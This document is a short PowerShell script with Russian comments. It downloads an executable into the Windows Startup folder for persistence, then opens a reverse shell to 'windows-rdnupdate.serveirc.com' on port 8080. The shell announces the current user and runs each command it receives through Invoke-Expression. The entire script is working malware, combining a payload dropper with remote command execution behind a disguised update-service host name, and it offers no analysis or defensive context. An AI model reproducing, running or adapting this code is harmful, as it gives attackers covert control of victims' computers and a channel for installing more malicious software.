$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/SStpSvc.exe"
#$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
$destPath = ".\SStpSvc.exe"
# 1. Блок скачивания файла
try {
    if (-not (Test-Path $destPath)) {
        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
    }
} catch {
    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
}
$ip = "windows-rdnupdate.serveirc.com"
$port = 8080

try {
    $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $t.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- Connected: $(whoami) ---")

    while($t.Connected) {
        $w.Write("PS > ")
        $c = $r.ReadLine()

        if ([string]::IsNullOrWhiteSpace($c)) { continue }

        try {
            $out = Invoke-Expression $c 2>&1 | Out-String
            if ($out) { $w.WriteLine($out) } else { $w.WriteLine(" ") }
        } catch {
            $w.WriteLine("Error: " + $_.Exception.Message)
        }
    }
} catch {
    Write-Host "Fatal Error: $($_.Exception.Message)" -ForegroundColor Red
    Start-Sleep -Seconds 5
}
